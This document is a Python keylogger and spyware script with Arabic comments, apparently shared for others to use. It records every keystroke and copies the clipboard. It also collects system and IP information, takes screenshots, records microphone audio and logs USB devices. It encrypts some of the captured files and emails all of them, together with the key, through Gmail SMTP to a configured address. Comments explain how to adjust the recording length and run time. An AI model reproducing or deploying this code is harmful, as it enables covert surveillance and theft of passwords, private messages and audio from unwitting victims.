from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import socket
import platform
import win32clipboard
import time
from PIL import ImageGrab
from scipy.io.wavfile import write
import sounddevice as sd
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pywinusb import hid
import threading

# ملفات تخزين المعلومات
log_file = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"

# ملفات التخزين المشفرة
encrypted_log_file = "e_key_log.txt"
encrypted_system_information = "e_systeminfo.txt"
encrypted_clipboard_information = "e_clipboard.txt"

# أسماء ملفات الصور والصوت
screenshot_files = ["screenshot1.png", "screenshot2.png", "screenshot3.png"]  # يلتقط 3 صور اذا تريد تزيد من هنا
audio_file = "audio.wav"

# إنشاء مفتاح التشفير
key = Fernet.generate_key()
cipher = Fernet(key)

# حفظ مفتاح التشفير في ملف
with open("encryption_key.key", "wb") as key_file:
    key_file.write(key)

# إعدادات البريد الإلكتروني
sender_email = "enter your email"
receiver_email = "enter you eamil"
password = "enter password"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(str(key.char))
        except AttributeError:
            f.write(f"[{key}]")

def on_release(key):
    if key == Key.esc:
        stop_keylogger()
        return False

def get_system_information():
    with open(system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write(f"Public IP Address: {public_ip}\n")
        except Exception:
            f.write("Couldn't get Public IP Address\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Private IP Address: {IPAddr}\n")

def copy_clipboard():
    with open(clipboard_information, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data + '\n')
        except:
            f.write("Clipboard could not be copied\n")

def take_screenshots():
    for i, file in enumerate(screenshot_files):
        im = ImageGrab.grab()
        im.save(file)
        time.sleep(8)

def record_audio(duration):
    fs = 44100
    seconds = duration
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(audio_file, fs, myrecording)

def encrypt_file(input_file, output_file):
    with open(input_file, "rb") as f:
        data = f.read()
    encrypted_data = cipher.encrypt(data)
    with open(output_file, "wb") as f:
        f.write(encrypted_data)

def check_files_and_send_email():
    # التحقق من وجود الملفات
    files_to_check = [encrypted_log_file, encrypted_system_information, encrypted_clipboard_information] + screenshot_files + [audio_file, "encryption_key.key"]
    for file in files_to_check:
        try:
            with open(file, "rb") as f:
                pass
        except FileNotFoundError:
            print(f"File not found: {file}")
            return
    
    # إذا كانت جميع الملفات موجودة، إرسال البريد الإلكتروني
    send_email(files_to_check)

def send_email(files_to_attach):
    # إعداد الرسالة
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Encrypted Keylogger Files"
    
    # إرفاق الملفات
    for file in files_to_attach:
        try:
            attachment = open(file, "rb")
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {file}")
            msg.attach(part)
            attachment.close()
        except Exception as e:
            print(f"Could not attach file {file}: {e}")
    
    # إرسال البريد الإلكتروني
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, msg.as_string())
    server.quit()

def usb_event_handler(event):
    with open("usb_log.txt", "a") as f:
        f.write(f"USB event: {event}\n")
    #مراقبة الفلاشة usb
def start_usb_monitoring():
    filter = hid.HidDeviceFilter()
    devices = filter.get_devices()
    for device in devices:
        device.open()
        device.set_raw_data_handler(usb_event_handler)

def stop_keylogger():
    # جمع المعلومات وتشفير الملفات
    get_system_information()
    copy_clipboard()
    take_screenshots()
    record_audio(10)   # ممكن تعدل مدة التسجيل 
    encrypt_file(log_file, encrypted_log_file)
    encrypt_file(system_information, encrypted_system_information)
    encrypt_file(clipboard_information, encrypted_clipboard_information)
    check_files_and_send_email()

    # إنهاء الاستماع لضغطات المفاتيح
    listener.stop()

# بدء الاستماع لضغطات المفاتيح
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()

# بدء مراقبة أجهزة USB
start_usb_monitoring()

# تشغيل مؤقت للتوقف بعد 5 دقائق
timer = threading.Timer(300, stop_keylogger) # مدة تشغيل البرنامج هنا 5 دقائق 300 ثانية ممكن التعديل
timer.start()

# انتظر حتى ينتهي الاستماع لضغطات المفاتيح
listener.join()

